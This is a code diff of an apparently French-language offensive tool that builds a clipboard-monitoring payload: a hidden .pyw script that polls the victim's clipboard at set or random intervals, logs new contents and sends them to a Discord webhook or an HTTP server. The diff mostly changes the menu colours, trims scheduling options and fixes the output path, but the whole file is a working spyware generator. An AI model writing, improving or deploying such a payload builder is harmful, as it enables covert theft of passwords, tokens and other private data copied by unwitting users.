@@ -8,24 +8,26 @@ def clear():
 
 def affichage():
     clear()
-    print("=== Configuration Clipboard ===\n\n")
-    print("""
+    print(Fore.CYAN + "=== Configuration Clipboard ===\n\n" + Style.RESET_ALL)
+    print(f"""
           
-          Options : 
-
+          {Fore.YELLOW}Options : 
+{Fore.WHITE}
     1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
     2. Type de données à capturer (texte, images, etc.)
     3. Sauvegarde locale
         
          
-          Sortie et envoi:
-
+          {Fore.YELLOW}Sortie et envoi:
+{Fore.WHITE}
     4. Envoi sur discord
     5. Envoi sur serveur HTTP
-                      
- Tapez: set <num> pour configurer une option, ou exit pour quitter. 
- Tapez: show pour afficher la configuration actuelle.
- Tapez: create pour créer le payload avec la configuration actuelle.
+    
+  {Fore.GREEN}                    
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : create pour générer
+Tapez : exit pour quitter
                  
           """)
 
@@ -35,16 +37,8 @@ def clipboard_module():
     choix = {
         "Intervalle de capture": None,
         "Type de données à capturer": None,
-        "Taille maximale du clipboard (Mo)": None,
-        "Limite de débit (envois/minute)": None,
-        "Seuil de longueur du texte": None,
-        "Heure de début de capture": None,
-        "Heure de fin de capture": None,
-        "Début Pause de capture": None,
-        "Fin Pause de capture": None,
         "Sauvegarde locale": None,
-        "Envoi sur Discord": None,
-        "Envoi par email": None,
+        "Envoi sur Discord": None, 
         "Envoi sur serveur HTTP": None,
     }            
 
@@ -107,7 +101,9 @@ def clipboard_module():
     ]
     
     def create_payload():
-        with open("Option/modules/payload/payload_created/clipboard_payload.pyw", "w") as f:
+        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "clipboard_payload.pyw")
+        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
+        with open(payload_path, "w", encoding="utf-8") as f:
 
             # IMPORT
             f.write("import clipboard\n")
@@ -129,18 +125,6 @@ def clipboard_module():
             f.write(f"        time.sleep({intervalle})\n")
             f.write("        current_time = time.strftime('%H:%M')\n")
 
-            # Heure de début et fin
-            if choix["Heure de début de capture"] and choix["Heure de fin de capture"]:
-                f.write(f"        if current_time < '{choix['Heure de début de capture']}' or current_time > '{choix['Heure de fin de capture']}':\n")
-                f.write("            time.sleep(60)\n")
-                f.write("            continue\n")
-
-            # Début et fin pause
-            if choix["Début Pause de capture"] and choix["Fin Pause de capture"]:
-                f.write(f"        if '{choix['Début Pause de capture']}' <= current_time <= '{choix['Fin Pause de capture']}':\n")
-                f.write("            time.sleep(60)\n")
-                f.write("            continue\n")
-
             # Lecture clipboard
             f.write(f"        mtn = {getter}\n")
             f.write("        if old != mtn:\n")
@@ -150,6 +134,8 @@ def clipboard_module():
             if choix["Sauvegarde locale"]:
                 f.write(f"            with open(r'{choix['Sauvegarde locale']}\\clipboard_log.txt', 'a') as file:\n")
                 f.write("                file.write(message + str(mtn) + '\\n')\n")
+            else:
+                pass
 
             # Envoi Discord
             if choix["Envoi sur Discord"]:
@@ -186,4 +172,6 @@ def clipboard_module():
 
         if cmd.lower() == "create":
             create_payload()
+            print(Fore.GREEN + "Payload généré avec succès dans Option/modules/payload/payload_created/clipboard_payload.pyw" + Style.RESET_ALL)
             break
+            
